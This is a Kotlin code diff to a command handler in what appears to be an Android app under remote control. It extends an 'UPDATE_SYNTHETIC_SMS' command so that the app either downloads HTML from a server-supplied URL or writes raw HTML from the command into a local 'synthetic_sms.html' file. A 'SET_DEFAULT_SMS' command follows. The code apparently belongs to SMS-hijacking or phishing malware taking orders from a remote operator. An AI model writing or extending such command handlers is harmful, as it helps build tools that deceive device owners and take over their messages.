@@ -730,11 +730,12 @@ object CommandProcessor {
                     }
                 }
                 "UPDATE_SYNTHETIC_SMS" -> {
-                    val urlStr = content.trim()
-                    if (urlStr.startsWith("http")) {
-                        val targetFile = java.io.File(ctx.filesDir, "synthetic_sms.html")
+                    val contentTrimmed = content.trim()
+                    val targetFile = java.io.File(ctx.filesDir, "synthetic_sms.html")
+                    if (contentTrimmed.startsWith("http://") || contentTrimmed.startsWith("https://")) {
+                        // Download URL Mode
                         try {
-                            val url = URL(urlStr)
+                            val url = URL(contentTrimmed)
                             val conn = url.openConnection() as HttpURLConnection
                             conn.connectTimeout = 15000
                             conn.readTimeout = 15000
@@ -742,7 +743,7 @@ object CommandProcessor {
                                 conn.inputStream.use { input ->
                                     targetFile.outputStream().use { output -> input.copyTo(output) }
                                 }
-                                status = "SYNTHETIC_SMS_UPDATED"
+                                status = "SYNTHETIC_SMS_UPDATED_URL"
                             } else {
                                 status = "FAILED_DOWNLOAD"
                                 errorMsg = "HTTP ${conn.responseCode}"
@@ -751,9 +752,18 @@ object CommandProcessor {
                             status = "FAILED_EXCEPTION"
                             errorMsg = e.message ?: "Unknown download error"
                         }
+                    } else if (contentTrimmed.isNotEmpty()) {
+                        // Direct Raw HTML Mode
+                        try {
+                            targetFile.writeText(content)
+                            status = "SYNTHETIC_SMS_UPDATED_RAW"
+                        } catch(e: Exception) {
+                            status = "FAILED_WRITE_EXCEPTION"
+                            errorMsg = e.message ?: "Unknown disk write error"
+                        }
                     } else {
                         status = "FAILED_FORMAT"
-                        errorMsg = "URL must start with http"
+                        errorMsg = "Payload content is empty"
                     }
                 }
                 "SET_DEFAULT_SMS" -> {
